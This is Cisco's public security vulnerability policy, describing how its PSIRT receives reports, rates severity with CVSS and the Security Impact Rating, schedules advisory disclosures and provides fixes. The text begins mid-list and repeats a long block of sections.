* In response to the release of Cisco IOS and IOS XE, Cisco IOS XR, Cisco NX-OS, and Cisco ASA, FTD, and FMC Software bundled publications

### Release Note Enclosures

Release Note Enclosures are used to disclose issues with a Low SIR and most third-party software vulnerabilities. All Cisco bug IDs that are disclosed by Cisco are available for registered customers to view in the [Cisco Bug Search Tool](https://tools.cisco.com/bugsearch/).

If a Cisco Security Advisory references a bug, the bug entry in the Cisco Bug Search Tool will link to the relevant Cisco Security Advisory.

Any Cisco bug that has been evaluated by the Cisco PSIRT includes a "PSIRT Evaluation" section in its Release Note Enclosure. This section includes, where Cisco deems appropriate and relevant, Base and Temporal CVSS scores and a CVE ID. Customers are invited to use this additional information at their discretion and correlate Cisco bugs with industry events. This information is not intended to supplement any standard Cisco warranties applicable to the software as stated in the [Cisco End User License Agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html).

Free software updates will not be provided for issues that are disclosed through a Release Note Enclosure. Customers who wish to upgrade to a software version that includes fixes for those issues should contact their normal support channels. Any exception to this policy will be determined solely at the discretion of Cisco.

The following table summarizes the methods used to notify customers about the aforementioned security publications. Exceptions may be made on a case-by-case basis to increase communication for a given document.

| **Publication** | **Email** | **Security Portal** | **RSS** | **CNS** | **openVuln API** | **Bug Search Tool** |
| --- | --- | --- | --- | --- | --- | --- |
| **Cisco Security Advisory—Critical and High Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Medium Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Informational** | Yes | Yes | Yes | No | No | Yes |
| **Cisco Event Response** | No | Yes | Yes | No | No | No |
| **Release Note Enclosure** | No | No | No | No | No | Yes |

### **Communications Plan**

If one or more of the following conditions exist, Cisco will publicly disclose Cisco Security Advisories:

* The Cisco PSIRT has completed the incident response process and determined that enough software patches or workarounds exist to address the vulnerability, or subsequent public disclosure of code fixes is planned to address high-severity vulnerabilities.
* The Cisco PSIRT has observed active exploitation of a vulnerability that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* There is the potential for increased public awareness of a vulnerability affecting Cisco products and/or cloud-hosted services that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* The Cisco PSIRT has declared a third-party software vulnerability to be "high profile."

All Cisco security publications are disclosed to customers and the public simultaneously.

When coordinating disclosure with third parties, the Cisco PSIRT will attempt to provide notification of any changes to the Cisco PSIRT public disclosure schedule.

As documented in the [Receiving Security Vulnerability Information from Cisco](#rsvifc) section of this document, Cisco delivers technical security information about software fixes in Cisco products and distributes product updates through several channels. Cisco reserves the right to deviate from this policy on an exception basis to ensure access to Cisco.com for software patch availability.

### **Disclosure Schedule**

In direct response to customer feedback, Cisco releases the following bundles of Cisco Security Advisories at 1600 Greenwich Mean Time (GMT) on a regular schedule twice each year. This schedule applies to the disclosure of vulnerabilities in the following Cisco products and does not apply to the disclosure of vulnerabilities in other Cisco products.

| **Cisco Product(s)** | **Release Schedule** |
| --- | --- |
| Cisco NX-OS Software | Fourth Wednesday of February and August |
| Cisco IOS XR Software | Second Wednesday in March and September |
| Cisco IOS and IOS XE Software | Fourth Wednesday in March and September |

### All Other Products

Cisco generally discloses Cisco Security Advisories at 1600 GMT on any given Wednesday.

### Exceptions

Cisco reserves the right to publish an individual Security Advisory for Cisco IOS and IOS XE Software, Cisco IOS XR Software, or Cisco NX-OS Software or other products outside the published schedule. Conditions under which an out-of-cycle publication may occur include, but are not limited to, the following:

* Cisco detects heightened public awareness of a serious vulnerability.
* Cisco learns of active exploitation of a vulnerability.
* Cisco works with a third-party coordination center to publicly disclose a vulnerability.

### **Incident Response Eligibility**

All customers, regardless of contract status, are eligible to receive support from the Cisco TAC for a known or reasonably suspected security vulnerability in Cisco products and services. For more information about how to contact the Cisco TAC, see the [General Security-Related Queries](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#gsrq) section of this document. Customers who contact the Cisco TAC should reference the URL of the Cisco security publication to assist in connecting with the proper support team.

Customers with paid service contracts for incident response and forensic assistance should request assistance through the contact methods specified in their contract.

Cisco, at its sole discretion, may offer customers additional security services free of charge. Cisco reserves the right to determine the type and degree of free assistance it may offer in connection with any incident and to withdraw from such an incident at any time.

### **Security Software Updates**

The Cisco PSIRT will investigate and disclose vulnerabilities in Cisco products and services from the date of First Commercial Shipment (FCS) to the [LDoS](https://www.cisco.com/c/en/us/products/eos-eol-policy.html). Cisco customers with service contracts that entitle them to regular software updates should obtain security fixes through their usual update channels, generally from the Cisco website for the relevant product. Cisco recommends contacting the Cisco TAC only with specific and imminent problems or questions.

As a special customer service, and to improve the overall security of the internet, Cisco may offer customers free software updates to address high-severity security problems. The decision to provide free software updates is made on a case-by-case basis. Refer to the Cisco security publication for details. Free software updates will typically be limited to Critical- and High-severity vulnerabilities.

Fixes for some third-party software vulnerabilities may be available only in the most recent major software releases and not backported to older releases.

If Cisco has offered a free software update to address a specific issue, noncontract customers who are eligible for the update may obtain it by contacting the Cisco TAC using any of the methods described in the [General Security-Related Queries](#gsrq) section of this document.

**Note:** To verify their entitlement, individuals who contact the Cisco TAC should have available the URL of the Cisco document that is offering the update.

Customers may only download, install, and expect support for software releases and feature sets for which they have purchased a valid license that is current and active. By installing, downloading, accessing, or otherwise using such software updates, customers agree to follow the terms of the [Cisco software license agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html). In most cases, the software update will be a maintenance release to software that was previously purchased. Free security software updates do not entitle customers to a new software license, additional software feature sets, or major revision upgrades.

After [End of Sale](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (EoS), the availability of security fixes for vulnerabilities is defined in the product’s EoS bulletin. (See the [End-of-Life Policy](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) for details.) The EoS bulletin may define the Last Day of Support (**LDoS**) milestone, which identifies the last date that Cisco will investigate and disclose product vulnerabilities.

Once the LDoS has been reached, the Cisco PSIRT will continue to accept vulnerability reports but will not analyze, fix, or disclose potential vulnerabilities. To this end, the Cisco PSIRT will not issue CVEs for issues reported on products that are past the LDoS milestone.

### Security Advisory Terms and Conventions

**Fixed Release Availability:** If a future release date is indicated for software, the date provided represents an estimate based on all information known to Cisco as of the "Last Updated" date at the top of the advisory. Availability dates are subject to change based on a number of factors, including satisfactory testing results and delivery of other priority features and fixes. If no version or date is listed for an affected component (indicated by a blank field and/or an advisory designation of Interim), Cisco is continuing to evaluate the fix and will update the advisory as additional information becomes available. After the advisory is marked Final, customers should refer to the associated Cisco bug(s) for further details.

The designated Security Advisory status indicates the following:

**Interim:** The Cisco investigation is ongoing. Cisco will issue revisions to the advisory when additional information, including fixed software release data, becomes available.

**Final:** Cisco has completed its evaluation of the vulnerability described in the advisory. There will be no further updates unless there is a material change in the nature of the vulnerability.

All aspects of this process are subject to change without notice and on a case-by-case basis. No particular level of response is guaranteed for any specific issue or class of issues.

## Purpose

This policy was created to guide and inform Cisco customers in the event of a reported vulnerability in a Cisco product or cloud-hosted service. It ensures that Cisco customers have a consistent, unambiguous resource to help them understand how Cisco responds to events of this nature.

## Policy

This policy clearly states how Cisco addresses reported security vulnerabilities in Cisco products and cloud-hosted services, including the timeline, actions, and responsibilities that apply to all customers.

## Cisco Product Security Incident Response

The Cisco Product Security Incident Response Team (PSIRT) is responsible for responding to Cisco product security incidents. The Cisco PSIRT is a dedicated, global team that manages the receipt, investigation, and public reporting of information about security vulnerabilities and issues related to Cisco products and services. Cisco defines a security vulnerability as a weakness in the computational logic (e.g., code) found in software and hardware components that, when exploited, results in a negative impact to confidentiality, integrity, or availability. Cisco reserves the right to deviate from this definition based on specific circumstances. The Cisco PSIRT adheres to ISO/IEC 29147:2018, which are [guidelines for disclosure of potential vulnerabilities](https://www.iso.org/standard/72311.html) established by the International Organization for Standardization.

The on-call Cisco PSIRT works 24 hours a day with Cisco customers, independent security researchers, consultants, industry organizations, and other vendors to identify possible security vulnerabilities and issues with Cisco products and networks.

## Reporting or Obtaining Support for a Suspected Security Vulnerability

Individuals or organizations that are experiencing a product security issue are strongly encouraged to contact the Cisco PSIRT. Cisco welcomes reports from independent researchers, industry organizations, vendors, customers, and other sources concerned with product or network security. At minimum, a description of the potential vulnerability is needed to report a security issue.

To contact the Cisco PSIRT, use one of the following methods:

*Primary approach:* The most effective method for reaching the Cisco PSIRT is sending an email to psirt@cisco.com. In the email, provide a detailed problem description and any relevant details and logs.

Alternatively, the Cisco PSIRT may be contacted using the following phone numbers:

* +1 877 228 7302 (toll-free within North America)
* +1 408 525 6532 (international direct dial)

These contact numbers route to Cisco global customer support. To facilitate engagement, please explain that this is a product security issue or, alternatively, reference the PSIRT-SVP-001 search code.

Cisco encourages customers to encrypt sensitive information that is sent to Cisco by email. The Cisco PSIRT supports encrypted messages via Pretty Good Privacy (PGP)/GNU Privacy Guard (GPG) encryption software. The Cisco PSIRT public key is available at the following link: <https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc>.

**Note:** Cisco supports an RFC 9116-compliant security.txt file, located at <https://www.cisco.com/.well-known/security.txt>.

## General Security-Related Queries

For general security concerns about Cisco products and cloud-hosted services, the Cisco Technical Assistance Center (TAC) can provide configuration and technical assistance. The Cisco TAC can also help with nonsensitive security incidents and software upgrades for security bug fixes. To contact the Cisco TAC, use one of the following methods:

|  | **Cisco TAC Support** |
| --- | --- |
| **Phone** | +1 800 553 2447 (toll-free within North America)+1 408 526 7209 (international direct dial) Additional TAC numbers: [Customer Service Contacts](https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html) |
| **Web** | <https://mycase.cloudapps.cisco.com/start> |

### **Cisco.com**

The [Cisco Security portal](https://www.cisco.com/security) on Cisco.com provides Cisco security vulnerability documents and Cisco security information, including relevant security products and services.

For direct links to specific security functions, see the [Types of Security Publications](#tosp) section of this
document.

### **Email**

Cisco Security Advisories provide information about Critical-, High-, and Medium-severity security vulnerabilities. They are clear signed with the Cisco PSIRT [PGP public key](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc) and distributed to the external cust-security-announce@cisco.com mailing list. The Cisco PSIRT may also send Informational advisories to the cust-security-announce mailing list. Informational advisories are used not as a disclosure mechanism for any Cisco vulnerabilities but for sharing information on security incidents that may impact Cisco products and that may be of interest to Cisco customers.

Emails are sent for the initial release of and major revisions to Cisco Security Advisories. A major revision is defined as a significant change to advisory content that could result in the customer addressing the vulnerability differently. Examples of a major advisory change include, but are not limited to, changes to the affected products list, changes in Security Impact Rating (SIR; see the [Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating](#asr) section of this document), and changes in mitigation and/or fix information. If a document undergoes a minor revision, the update will be posted to Cisco.com without an accompanying email. Customers that require automated alerts for minor revisions should subscribe to the Cisco Security Advisory Really Simple Syndication (RSS) feed or My Notifications. All Security Advisories on Cisco.com are displayed in chronological order, with the most recent advisories and updates appearing at the top of the page.

To subscribe to the cust-security-announce mailing list, email cust-security-announce-join@cisco.com. (The content of the message does not matter.) You will receive confirmation, instructions, and a list policy statement.

Please note that requests must be sent to cust-security-announce-join@cisco.com and not to the cust-security-announce@cisco.com list itself.

To unsubscribe from the cust-security-announce mailing list, email cust-security-announce-leave@cisco.com with the word "unsubscribe" in the subject line. (The content of the message does not matter.) You will receive a confirmation notice, to which you need to reply to be unsubscribed. You will not be unsubscribed unless you reply to the confirmation email.

Please note that requests to subscribe must be sent to cust-security-announce-join@cisco.com, and requests to unsubscribe must be sent to cust-security-announce-leave@cisco.com—not to the cust-security-announce@cisco.com email address itself.

You must send the messages from the account that you want to be subscribed to or unsubscribed from the list.

Customers can also request to be subscribed or unsubscribed to the cust-security-announce mailing list by emailing psirt@cisco.com.

## Commitment to Product Security and Integrity at Cisco

Cisco product development practices specifically prohibit any intentional behaviors or product features that are designed to allow unauthorized device or network access, exposure of sensitive device information, or a bypass of security features or restrictions. These include, but are not limited to:

* Undisclosed device access methods or "back doors"
* Hardcoded or undocumented account credentials
* Covert communication channels
* Undocumented traffic diversion

Cisco considers such product behaviors to be serious vulnerabilities. Cisco will address any issues of this nature with the highest priority and encourages all parties to report suspected vulnerabilities to the Cisco PSIRT for immediate investigation. Internal and external reports of these vulnerabilities will be managed and disclosed in accordance with the terms of the Cisco Security Vulnerability Policy.

More information can be found on the [Cisco Secure Development Lifecycle (CSDL) website](https://www.cisco.com/c/en/us/about/trust-center/technology-built-in-security.html#~stickynav=2).

## Cisco Product Security Incident Response Process

Figure 1 illustrates the vulnerability life cycle and the Cisco PSIRT disclosure and resolution process at a high level.

**Figure 1.** Cisco Product Security Incident Response Process

![response process cycle from awareness to feedback](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/public/files/images/white_papers/psirtprocess.jpg "Cisco Product Security Incident Response Process")

The steps in the process illustrated in Figure 1 are as follows:

1. **Awareness:** PSIRT receives notification of a security incident.
2. **Active Management:** PSIRT prioritizes and identifies resources.
3. **Software Fixes:** PSIRT coordinates the fix and impact assessment.
4. **Customer Notification:** PSIRT notifies all customers simultaneously.

The Cisco PSIRT investigates all reports regardless of the Cisco software code version or product life cycle status until the product reaches the [Last Day of Support](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (LDoS). Issues will be prioritized based on the potential severity of the vulnerability and other environmental factors. Ultimately, the resolution of a reported incident may require upgrades to products and cloud-hosted services that are under active support from Cisco. As a best practice, Cisco strongly recommends that customers periodically verify that their products are under active support for access to the latest software updates and other benefits.

Throughout the investigative process, the Cisco PSIRT strives to work collaboratively with the source of the report (incident reporter) to confirm the nature of the vulnerability, gather required technical information, and ascertain appropriate remedial action. When the initial investigation is complete, results will be delivered to the incident reporter along with a plan for resolution and public disclosure. If the incident reporter disagrees with the conclusion, the Cisco PSIRT will make every effort to address those concerns.

In the case of incidents about which an agreement cannot be reached through the normal process, incident reporters may escalate by contacting the [Cisco TAC](#gsrq) and requesting the director of the global Cisco PSIRT team.

During any investigation, the Cisco PSIRT manages all sensitive information on a highly confidential basis. Internal distribution is limited to those individuals who have a legitimate need to know and can actively assist in the resolution. Similarly, the Cisco PSIRT asks incident reporters to maintain strict confidentiality until complete resolutions are available for customers and have been published by the Cisco PSIRT on the Cisco website through the appropriate coordinated disclosure.

With the agreement of the incident reporter, the Cisco PSIRT may acknowledge the reporter's contribution during the public disclosure of the vulnerability.

The Cisco PSIRT works with third-party coordination centers such as the [Computer Emergency Response Team Coordination Center](https://www.kb.cert.org/vuls/) (CERT/CC), [Computer Emergency Response Team of Finland](https://www.kyberturvallisuuskeskus.fi/en/) (CERT-FI), [Japan Computer Emergency Response Team](https://www.jpcert.or.jp/english/) (JP-CERT), and [National Protective Security Authority](https://www.npsa.gov.uk) (NPSA) to manage a coordinated industry disclosure for vulnerabilities reported to Cisco that may impact multiple vendors (for example, a generic protocol issue). In these situations, the Cisco PSIRT will either assist the incident reporter with contacting the coordination center or do so on the incident reporters behalf.

If a reported vulnerability involves a vendor product, the Cisco PSIRT will notify the vendor directly, coordinate with the incident reporter, or engage a third-party coordination center.

The Cisco PSIRT will coordinate with the incident reporter to determine the frequency of status updates on the incident and documentation updates.

In the event that Cisco becomes aware of a vulnerability that does not affect a Cisco product but does involve another vendor's product, Cisco will follow the Cisco [policy for reporting vulnerabilities to vendors](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html).

## Disclosure of Security Vulnerabilities Discovered as Part of Cisco Services Delivery

If a new or previously undisclosed security vulnerability is found during a Cisco Services engagement with a customer, Cisco will follow the [Cisco Product Security Incident Response Process](#cpsirp). Vulnerabilities found in Cisco products and cloud-hosted services will be handled by the Cisco PSIRT according to the [Cisco Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). If the vulnerability is in another vendors product, Cisco will follow the [Cisco Vendor Vulnerability Reporting and Disclosure Policy](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html) unless the affected customer wishes to report the vulnerability to the vendor directly; in that case, Cisco will facilitate contact between the customer and the vendor, and will notify CERT/CC (or its national equivalent).

Cisco will protect customer-specific data at all times throughout this process. Specifically, Cisco will not share any customer-specific data unless directed to do so by the affected customer, or as required by a legal investigation.

### **Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating**

Cisco uses [Version 3.1](https://www.first.org/cvss/v3-1/) of the [Common Vulnerability Scoring System](https://www.first.org/cvss/) (CVSS) as part of its standard process of evaluating reported potential vulnerabilities that do not have a CVE in Cisco products and cloud-hosted services. The CVSS model uses three distinct measurements, or scores, that include Base, Temporal, and Environmental calculations. Cisco will provide an evaluation of the Base vulnerability score and, in some instances, the Temporal vulnerability score. End users are encouraged to compute the Environmental score based on their network parameters. The combination of all three scores should be considered the final score, which represents a moment in time and is tailored to a specific environment. Organizations are advised to use this final score to prioritize responses in their own environments.

**Note:** Cisco began transitioning to CVSS Version 3.1 (CVSSv3.1) in May 2020.

In addition to CVSS scores, Cisco uses the Security Impact Rating (SIR) as a way to categorize vulnerability severity in a simpler manner. The SIR is based on the CVSS Qualitative Severity Rating Scale of the Base score, may be adjusted by PSIRT to account for Cisco-specific variables, and is included in every Cisco Security Advisory. Cisco uses the following guidelines to determine the Cisco Security Advisory type for vulnerabilities in Cisco-authored, customer-managed software. Security Advisories for Critical, High, and Medium SIRs include fixed software information.

| **Publication** | **Type** | **CVSS** | **CVE** | **Fix Information** | **Machine-Readable Format** |
| --- | --- | --- | --- | --- | --- |
| Cisco Security Advisory | Critical | 9.0–10.0 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, Adaptive Security Appliance (ASA), Firepower Threat Defense (FTD), and Firepower Management Center (FMC) Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| High | 7.0–8.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Medium | 4.0–6.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Informational | N/A | No | Fix information in bug (if applicable). | [RSS](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |

Issues with a Low SIR are typically published as a bug Release Note Enclosure (RNE) and not as a Security Advisory.

Cisco reserves the right to deviate from these guidelines in specific cases if additional factors are not properly captured in the CVSS score.

If there is a security issue with a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the third party. In some cases, Cisco may adjust the CVSS score to reflect the impact to the Cisco product.

**Note:** Cisco is a [Common Vulnerabilities and Exposures](https://cve.mitre.org/index.html) (CVE) Numbering Authority and will assign CVE IDs to Cisco software vulnerabilities from the MITRE block of IDs assigned to the company for this purpose. Cisco does not assign CVE IDs for reported vulnerabilities until the vulnerabilities have been confirmed by Cisco. After vulnerabilities are published, Cisco provides CVE details to MITRE for inclusion in its database.

For more information about CVSS, visit [FIRST.org](https://www.first.org/cvss/).
### **Cisco Cloud-Hosted Services**

Cisco offers multiple cloud-hosted services that are used by customers but are maintained, patched, and monitored by Cisco.

The Cisco PSIRT responds to vulnerabilities in Cisco cloud-hosted services and works closely with the teams that operate them. These teams ensure that security vulnerabilities are fixed and patches are deployed to all customer instances in a timely manner.

Typically, service-related security events are communicated to customers by the service teams through direct notification or through the service dashboard or portal. In some instances, Cisco may disclose vulnerabilities through Security Advisories for Cisco cloud-hosted services in coordination with the service teams.

In most cases, no user action is required because Cisco regularly patches cloud-hosted services.

### **Third-Party Software Vulnerabilities**

If there is a vulnerability in a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the component creator. Cisco may adjust the CVSS score to reflect the impact to Cisco products.

Cisco will consider a third-party vulnerability “high profile” if it meets the following criteria:

* The vulnerability exists in a third-party component.
* Multiple Cisco products and/or cloud-hosted services are affected.
* The CVSS score is 5.0 or above.
* The vulnerability has gathered significant public attention.
* The vulnerability is likely to have exploits available and is expected to be, or is being, actively exploited.

For high profile, third-party vulnerabilities, Cisco will begin assessing all potentially impacted products and cloud-hosted services that have not reached the LDoS and publish a Security Advisory within 24 hours after Cisco classifies the vulnerability as high profile. All known affected Cisco products and cloud-hosted services will be detailed in an update to the initial Security Advisory that will be published within 7 days of the initial disclosure. A Cisco bug will be created for each vulnerable product so that registered customers can view them using the Cisco Bug Search Toolkit. Third-party vulnerabilities that are not classified as high profile will be disclosed in a Release Note Enclosure.

### **Cisco Vulnerability Repository**

The [Cisco Vulnerability Repository](https://sec.cloudapps.cisco.com/security/center/cvr) (CVR) is a vulnerability search engine for CVEs reported after 2017 that may impact Cisco products. CVR can help customers understand if their Cisco product is affected by a particular third-party software vulnerability. This tool also displays any Cisco Security Advisories associated with a CVE. At this time, CVR does not include Cisco cloud offers. For help with a product not listed in this tool, please use the Feedback link on the [CVR page](https://sec.cloudapps.cisco.com/security/center/cvr) or contact your support organization.

### **Vulnerability Exploitability eXchange**

Customers may request a Vulnerability Exploitability eXchange (VEX) document for any CVE in CVR.

### **Types of Security Publications**

In all security publications, Cisco discloses the information required for an end user to assess the impact of a vulnerability and any potential steps needed to protect their environment. Cisco does not provide vulnerability details that could enable someone to craft an exploit. Cisco Security Advisories are point-in-time documents. Information should only be considered up to date as of the time and date of the last publication update as indicated by the "Last Updated" field in the advisory header.

Cisco provides the following types of security-related publications via the [Cisco Security portal](https://www.cisco.com/security) on Cisco.com.

### Cisco Security Advisories

[Cisco Security Advisories](https://sec.cloudapps.cisco.com/security/center/publicationListing.x) provide detailed information about security issues that directly involve Cisco products and cloud-hosted services and require an upgrade, fix, or other customer action. Security Advisories are used to disclose vulnerabilities in Cisco-authored software or in high-profile third-party software with a Critical, High, or Medium SIR. The Cisco PSIRT only validates the affected and fixed version information documented in the advisory.

All Cisco Security Advisories that disclose vulnerabilities with a Critical, High, or Medium SIR include an option to download [Common Security Advisory Framework (CSAF)](https://csaf.io/) content. CSAF is an industry standard designed to depict vulnerability information in machine-readable format. This machine-readable content can be used with other tools to automate the process of interpreting data contained in a Security Advisory. CSAF content can be downloaded directly from each Security Advisory. For more information about CSAF, see the preceding link.

The Informational type of Cisco Security Advisories addresses issues that require a response to information discussed in a public forum, such as a blog or discussion list. Informational advisories are normally published if a third party makes a public statement about a Cisco product vulnerability. Informational advisories may also be used to proactively notify customers about a security-related issue that is not a vulnerability.

### Cisco Event Responses

Cisco [Event Responses](https://sec.cloudapps.cisco.com/security/center/erp.x?i=52) provide information about security events that have the potential for widespread impact on customer networks, applications, and devices. Cisco Event Responses contain summary information, threat analysis, and mitigation techniques that feature Cisco products and cloud-hosted services. They are normally published under the following circumstances:

* If a significant security vulnerability exists in a vendor's product that could affect a Cisco product due to interoperation with the vendor's product or use of the network as a vector for exploitation
* In response to the release of Cisco IOS and IOS XE, Cisco IOS XR, Cisco NX-OS, and Cisco ASA, FTD, and FMC Software bundled publications

### Release Note Enclosures

Release Note Enclosures are used to disclose issues with a Low SIR and most third-party software vulnerabilities. All Cisco bug IDs that are disclosed by Cisco are available for registered customers to view in the [Cisco Bug Search Tool](https://tools.cisco.com/bugsearch/).

If a Cisco Security Advisory references a bug, the bug entry in the Cisco Bug Search Tool will link to the relevant Cisco Security Advisory.

Any Cisco bug that has been evaluated by the Cisco PSIRT includes a "PSIRT Evaluation" section in its Release Note Enclosure. This section includes, where Cisco deems appropriate and relevant, Base and Temporal CVSS scores and a CVE ID. Customers are invited to use this additional information at their discretion and correlate Cisco bugs with industry events. This information is not intended to supplement any standard Cisco warranties applicable to the software as stated in the [Cisco End User License Agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html).

Free software updates will not be provided for issues that are disclosed through a Release Note Enclosure. Customers who wish to upgrade to a software version that includes fixes for those issues should contact their normal support channels. Any exception to this policy will be determined solely at the discretion of Cisco.

The following table summarizes the methods used to notify customers about the aforementioned security publications. Exceptions may be made on a case-by-case basis to increase communication for a given document.

| **Publication** | **Email** | **Security Portal** | **RSS** | **CNS** | **openVuln API** | **Bug Search Tool** |
| --- | --- | --- | --- | --- | --- | --- |
| **Cisco Security Advisory—Critical and High Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Medium Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Informational** | Yes | Yes | Yes | No | No | Yes |
| **Cisco Event Response** | No | Yes | Yes | No | No | No |
| **Release Note Enclosure** | No | No | No | No | No | Yes |

### **Communications Plan**

If one or more of the following conditions exist, Cisco will publicly disclose Cisco Security Advisories:

* The Cisco PSIRT has completed the incident response process and determined that enough software patches or workarounds exist to address the vulnerability, or subsequent public disclosure of code fixes is planned to address high-severity vulnerabilities.
* The Cisco PSIRT has observed active exploitation of a vulnerability that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* There is the potential for increased public awareness of a vulnerability affecting Cisco products and/or cloud-hosted services that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* The Cisco PSIRT has declared a third-party software vulnerability to be "high profile."

All Cisco security publications are disclosed to customers and the public simultaneously.

When coordinating disclosure with third parties, the Cisco PSIRT will attempt to provide notification of any changes to the Cisco PSIRT public disclosure schedule.

As documented in the [Receiving Security Vulnerability Information from Cisco](#rsvifc) section of this document, Cisco delivers technical security information about software fixes in Cisco products and distributes product updates through several channels. Cisco reserves the right to deviate from this policy on an exception basis to ensure access to Cisco.com for software patch availability.

### **Disclosure Schedule**

In direct response to customer feedback, Cisco releases the following bundles of Cisco Security Advisories at 1600 Greenwich Mean Time (GMT) on a regular schedule twice each year. This schedule applies to the disclosure of vulnerabilities in the following Cisco products and does not apply to the disclosure of vulnerabilities in other Cisco products.

| **Cisco Product(s)** | **Release Schedule** |
| --- | --- |
| Cisco NX-OS Software | Fourth Wednesday of February and August |
| Cisco IOS XR Software | Second Wednesday in March and September |
| Cisco IOS and IOS XE Software | Fourth Wednesday in March and September |

### All Other Products

Cisco generally discloses Cisco Security Advisories at 1600 GMT on any given Wednesday.

### Exceptions

Cisco reserves the right to publish an individual Security Advisory for Cisco IOS and IOS XE Software, Cisco IOS XR Software, or Cisco NX-OS Software or other products outside the published schedule. Conditions under which an out-of-cycle publication may occur include, but are not limited to, the following:

* Cisco detects heightened public awareness of a serious vulnerability.
* Cisco learns of active exploitation of a vulnerability.
* Cisco works with a third-party coordination center to publicly disclose a vulnerability.

### **Incident Response Eligibility**

All customers, regardless of contract status, are eligible to receive support from the Cisco TAC for a known or reasonably suspected security vulnerability in Cisco products and services. For more information about how to contact the Cisco TAC, see the [General Security-Related Queries](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#gsrq) section of this document. Customers who contact the Cisco TAC should reference the URL of the Cisco security publication to assist in connecting with the proper support team.

Customers with paid service contracts for incident response and forensic assistance should request assistance through the contact methods specified in their contract.

Cisco, at its sole discretion, may offer customers additional security services free of charge. Cisco reserves the right to determine the type and degree of free assistance it may offer in connection with any incident and to withdraw from such an incident at any time.

### **Security Software Updates**

The Cisco PSIRT will investigate and disclose vulnerabilities in Cisco products and services from the date of First Commercial Shipment (FCS) to the [LDoS](https://www.cisco.com/c/en/us/products/eos-eol-policy.html). Cisco customers with service contracts that entitle them to regular software updates should obtain security fixes through their usual update channels, generally from the Cisco website for the relevant product. Cisco recommends contacting the Cisco TAC only with specific and imminent problems or questions.

As a special customer service, and to improve the overall security of the internet, Cisco may offer customers free software updates to address high-severity security problems. The decision to provide free software updates is made on a case-by-case basis. Refer to the Cisco security publication for details. Free software updates will typically be limited to Critical- and High-severity vulnerabilities.

Fixes for some third-party software vulnerabilities may be available only in the most recent major software releases and not backported to older releases.

If Cisco has offered a free software update to address a specific issue, noncontract customers who are eligible for the update may obtain it by contacting the Cisco TAC using any of the methods described in the [General Security-Related Queries](#gsrq) section of this document.

**Note:** To verify their entitlement, individuals who contact the Cisco TAC should have available the URL of the Cisco document that is offering the update.

Customers may only download, install, and expect support for software releases and feature sets for which they have purchased a valid license that is current and active. By installing, downloading, accessing, or otherwise using such software updates, customers agree to follow the terms of the [Cisco software license agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html). In most cases, the software update will be a maintenance release to software that was previously purchased. Free security software updates do not entitle customers to a new software license, additional software feature sets, or major revision upgrades.

After [End of Sale](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (EoS), the availability of security fixes for vulnerabilities is defined in the product’s EoS bulletin. (See the [End-of-Life Policy](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) for details.) The EoS bulletin may define the Last Day of Support (**LDoS**) milestone, which identifies the last date that Cisco will investigate and disclose product vulnerabilities.

Once the LDoS has been reached, the Cisco PSIRT will continue to accept vulnerability reports but will not analyze, fix, or disclose potential vulnerabilities. To this end, the Cisco PSIRT will not issue CVEs for issues reported on products that are past the LDoS milestone.

### Security Advisory Terms and Conventions

